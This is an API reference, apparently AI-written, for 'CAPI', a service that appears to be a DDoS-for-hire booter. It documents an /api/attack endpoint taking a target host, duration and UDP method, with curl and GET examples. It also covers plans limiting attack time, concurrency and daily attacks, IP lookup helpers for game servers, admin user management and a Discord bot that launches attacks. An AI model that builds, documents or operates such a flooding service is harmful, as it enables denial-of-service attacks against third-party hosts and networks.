---
# CAPI API Reference

A compact, readable reference for the CAPI HTTP API. Example requests use the public demo domain:

Base URL: https://capi.capysploit.workers.dev/

This document groups endpoints by area, shows required parameters, auth details, and concise example requests + responses.

Table of contents
- [Public API](#public-api)
- [Admin API](#admin-api)
- [Lookup Helpers](#lookup-helpers)
- [Discord Integration](#discord-integration)
- [Security Notes](#security-notes)

---

## Public API
All public endpoints return JSON with at least `error` and `message`. Fields such as `warnings` are numeric counts (0,1,2...).

### View profile
- Endpoint: `GET /api/view_profile`
- Example: `GET https://capi.capysploit.workers.dev/api/view_profile?username=alice`
- Query params: `username` (optional)
- Response (success):

```json
{
  "error": false,
  "message": "profile loaded",
  "data": {
    "profile": {
      "username": "alice",
      "admin": false,
      "vip": true,
      "api_access": true,
      "max_time": 60,
      "min_time": 30,
      "concurrents": 1,
      "max_daily_attacks": 100,
      "suspended": false,
      "warnings": 1,
      "discord_link": null
    }
  }
}
```

### View plan
- Endpoint: `GET /api/view_plan`
- Example: `GET https://capi.capysploit.workers.dev/api/view_plan?username=alice`
- Returns plan fields and numeric `warnings`.

### Discord profile lookup
- Endpoint: `GET /api/discord_profile`
- Example: `GET https://capi.capysploit.workers.dev/api/discord_profile?discord_user_id=123456789`
- Returns linked CAPI account for a Discord user.

### Link / verify flow
- Create verification: `GET /api/link?client=discord&discord_user_id=...&discord_username=...`
- Verify (account): `GET /api/verify?username=alice&password=secret&client=discord`

### Start an attack
- Endpoint: `GET /api/attack`
- Example (user creds):

```
GET https://capi.capysploit.workers.dev/api/attack?username=alice&password=secret&host=1.2.3.4&time=60&method=UDP
```

- Bot-auth example (use header):

```
curl -H "Authorization: Bearer $BOT_API_KEY" \
  "https://capi.capysploit.workers.dev/api/attack?discord_user_id=123&host=1.2.3.4&time=60&method=UDP"
```

- Success response:

```json
{ "error": false, "message": "attack accepted", "data": { "id": "abc123", "host": "1.2.3.4" } }
```

### Stop an attack
- Endpoint: `GET /api/stop`
- Example: `GET https://capi.capysploit.workers.dev/api/stop?id=abc123&username=alice`
- Response: `{ "error": false, "message": "stopped", "kill_id": "abc123" }`

### Other public endpoints
- `/api/view_ongoing` — list current attacks
- `/api/network_statistics` — service stats

---

## Admin API
Admin endpoints currently accept `username` and `password` in query parameters (legacy). For production use POST and header-based auth.

Base example: `https://capi.capysploit.workers.dev/admin/<action>?username=admin&password=secret&...`

Key endpoints:

- `GET /admin/add_user` — create user
- `GET /admin/edit_user` — change fields
- `GET /admin/delete_user` — remove user
- `GET /admin/view_user_plan?user_to_view=<username>` — returns detailed user object (booleans are true/false)

Example `view_user_plan` response:

```json
{
  "error": false,
  "message": "user plan loaded",
  "data": {
    "user": {
      "username": "root",
      "admin": true,
      "reseller": false,
      "vip": false,
      "holder": false,
      "api_access": true,
      "suspended": false,
      "warnings": 0
    }
  }
}
```

Admin utilities: `view_all_users`, `view_all_logs`, `suspend_user`, `unsuspend_user`, `add_blacklist`, `list_blacklist`, etc.

---

## Lookup helpers
These endpoints wrap 3rd-party lookups:

- `GET /lookup/lookup_fivem?code=...`
- `GET /lookup/lookup_mc?address=...`
- `GET /lookup/lookup_ip?ip=...`

Example: `https://capi.capysploit.workers.dev/lookup/lookup_ip?ip=1.2.3.4`

---

## Discord integration
- `POST /discord/register` — register slash commands (needs `DISCORD_BOT_TOKEN`, `DISCORD_CLIENT_ID`, `DISCORD_GUILD_ID`).
- Interactions are validated using `DISCORD_PUBLIC_KEY` signature checks.
- The server-side bot uses `BOT_API_KEY` for privileged actions — keep it secret and out of URLs.

---

## Security notes
- Passwords are currently stored and compared in plain text — migrate to a secure hashing algorithm (bcrypt/argon2) ASAP.
- Avoid sending credentials in query strings. Prefer `POST` + `Authorization` headers.
- Protect `BOT_API_KEY`; it can be used to impersonate linked users.

---

## Want more?
- I can expand each endpoint with fully worked example requests (curl, JS) and full response bodies.
- I can generate an OpenAPI (Swagger) YAML from this reference.

---


